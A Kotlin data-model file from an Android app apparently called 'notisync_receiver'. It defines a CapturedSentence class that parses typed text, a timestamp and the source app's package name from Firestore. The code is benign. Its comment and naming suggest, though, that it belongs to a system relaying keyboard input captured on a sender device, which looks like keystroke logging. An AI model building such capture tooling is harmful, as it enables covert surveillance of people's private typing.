// ============================================================
// FILE: app/src/main/java/com/app/notisync_receiver/domain/model/CapturedSentence.kt
// Purpose: Represents a captured sentence from sender keyboard
// ============================================================

package com.app.notisync_receiver.domain.model

data class CapturedSentence(
    val text: String,
    val capturedAt: Long,
    val appPackage: String
) {
    companion object {
        @Suppress("UNCHECKED_CAST")
        fun fromFirestore(map: Map<String, Any>): CapturedSentence {
            return CapturedSentence(
                text = map["text"] as? String ?: "",
                capturedAt = (map["capturedAt"] as? Number)?.toLong() ?: 0L,
                appPackage = map["appPackage"] as? String ?: ""
            )
        }
    }
}
